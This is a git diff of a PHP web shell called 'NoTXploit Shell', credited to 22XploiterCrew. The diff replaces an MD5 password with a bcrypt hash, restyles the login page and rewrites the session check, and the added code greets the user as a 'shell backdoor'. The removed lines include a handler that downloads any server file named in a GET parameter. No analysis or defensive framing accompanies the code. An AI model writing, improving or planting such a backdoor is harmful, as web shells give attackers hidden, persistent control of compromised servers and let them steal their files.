@@ -1,9 +1,4 @@
 <?php
-/*
-[ Tak semua kami ngotak sendiri ]
-Special thanks for Holiq@Indosec
-Collabs team 22XploiterCrew ft Indosec Coder Team
-*/
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -14,7 +9,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password 			= "21232f297a57a5a743894a0e4a801fc3";   // admin
+$password_hash = '$2y$10$b9tkoH5LcnS./JGPSLBDKeBK6Da1MlCBiSpcnLzm61XdmdruB5A46';
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -29,143 +24,145 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 function login_shell() {
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ NoTXploit Shell ]</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Righteous&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=New+Rocker&display=swap');
-
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Righteous', sans-serif;
-            background: url('https://od.lk/s/NV8yMDEwODUxOTVf/1341150.png') no-repeat center center fixed;
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #fff;
-        }
-
-        .login-container {
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            width: 320px;
-        }
-
-        .login-container h2 {
-            font-family: 'New Rocker', serif;
-            font-size: 28px;
-            margin-bottom: 20px;
-        }
-
-        .login-container img {
-            width: 100px;
-            height: 100px;
-            margin-bottom: 20px;
-            border-radius: 50%;
-            border: 2px solid #fff;
-        }
-
-        .login-container form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .login-container input[type="password"] {
-            padding: 10px;
-            font-size: 14px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            outline: none;
-            transition: border-color 0.3s;
-            background: #333;
-            color: #fff;
-        }
-
-        .login-container input[type="password"]:focus {
-            border-color: #ff5722;
-        }
-
-        .login-container input[type="submit"] {
-            background: #ff5722;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            padding: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .login-container input[type="submit"]:hover {
-            background: #e64a19;
-        }
-
-        .login-container small {
-            margin-top: 10px;
-            display: block;
-            color: #bbb;
-        }
-
-        .login-container small a {
-            color: #ff5722;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .login-container small a:hover {
-            color: #ffffff;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="https://od.lk/s/NV8yMDEwODU3OTNf/ninja.png" alt="Admin">
-        <h2>./NoTXploit Login Shell</h2>
-        <form method="post" action="">
-            <input type="password" name="password" placeholder="Enter your password">
-            <input type="submit" value="Login">
-        </form>
-        <small>
-            Copyright &copy; <a href="https://22xploitercrew.com" target="_blank" style="color: #ff5722; text-decoration: none;">22XploiterCrew</a>. 
-            Recode By 
-            <a href="https://google.com" target="_blank" style="color: #e64a19; text-decoration: none;">./NoTXploit</a>
-        </small>        
-    </div>
-</body>
-</html>
-<?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
-	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-else
-login_shell();
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-	@ob_clean();
-	$file = $_GET['file'];
-	header('Content-Description: File Transfer');
-	header('Content-Type: application/octet-stream');
-	header('Content-Disposition: attachment; filename="'.basename($file).'"');
-	header('Expires: 0');
-	header('Cache-Control: must-revalidate');
-	header('Pragma: public');
-	header('Content-Length: ' . filesize($file));
-	readfile($file);
-	exit;
-}
-?>
+	?>
+	<!DOCTYPE html>
+	<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>[ NoTXploit Shell ]</title>
+		<style>
+			@import url('https://fonts.googleapis.com/css2?family=Righteous&display=swap');
+			@import url('https://fonts.googleapis.com/css2?family=New+Rocker&display=swap');
+	
+			body {
+				margin: 0;
+				padding: 0;
+				font-family: 'Righteous', sans-serif;
+				background: url('https://od.lk/s/NV8yMDEwODUxOTVf/1341150.png') no-repeat center center fixed;
+				background-size: cover;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				height: 100vh;
+				color: #fff;
+			}
+	
+			.login-container {
+				padding: 30px;
+				border-radius: 10px;
+				box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+				text-align: center;
+				width: 320px;
+				background: rgba(0, 0, 0, 0.8);
+			}
+	
+			.login-container h2 {
+				font-family: 'New Rocker', serif;
+				font-size: 28px;
+				margin-bottom: 20px;
+			}
+	
+			.login-container img {
+				width: 100px;
+				height: 100px;
+				margin-bottom: 20px;
+				border-radius: 50%;
+				border: 2px solid #fff;
+			}
+	
+			.login-container form {
+				display: flex;
+				flex-direction: column;
+				gap: 15px;
+			}
+	
+			.login-container input[type="password"] {
+				padding: 10px;
+				font-size: 14px;
+				border: 1px solid #ccc;
+				border-radius: 5px;
+				outline: none;
+				transition: border-color 0.3s;
+				background: #333;
+				color: #fff;
+			}
+	
+			.login-container input[type="password"]:focus {
+				border-color: #ff5722;
+			}
+	
+			.login-container input[type="submit"] {
+				background: #ff5722;
+				color: #fff;
+				border: none;
+				border-radius: 5px;
+				padding: 10px;
+				font-size: 16px;
+				cursor: pointer;
+				transition: background-color 0.3s;
+			}
+	
+			.login-container input[type="submit"]:hover {
+				background: #e64a19;
+			}
+	
+			.login-container small {
+				margin-top: 10px;
+				display: block;
+				color: #bbb;
+			}
+	
+			.login-container small a {
+				color: #ff5722;
+				text-decoration: none;
+				transition: color 0.3s;
+			}
+	
+			.login-container small a:hover {
+				color: #ffffff;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="login-container">
+			<img src="https://od.lk/s/NV8yMDEwODU3OTNf/ninja.png" alt="Admin">
+			<h2>./NoTXploit Login Shell</h2>
+			<form method="post" action="">
+				<input type="password" name="password" placeholder="Enter your password">
+				<input type="submit" value="Login">
+			</form>
+			<small>
+				Copyright &copy; <a href="https://22xploitercrew.com" target="_blank" style="color: #ff5722; text-decoration: none;">22XploiterCrew</a>. 
+				Recode By 
+				<a href="https://google.com" target="_blank" style="color: #e64a19; text-decoration: none;">./NoTXploit</a>
+			</small>        
+		</div>
+	</body>
+	</html>
+	<?php
+		exit;
+	}
+	
+	// Proses autentikasi
+	if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+		if (isset($_POST['password'])) {
+			if (password_verify($_POST['password'], $password_hash)) {
+				// Jika password benar, set session
+				$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+			} else {
+				// Jika salah, tampilkan ulang halaman login
+				echo "<script>alert('Password salah!');</script>";
+				login_shell();
+			}
+		} else {
+			login_shell();
+		}
+	}
+	
+	// Setelah login berhasil
+	echo "Selamat datang di shell backdoor!";
+	?>
 <?php
 	function w($dir,$perm) {
 		if(!is_writable($dir)) {
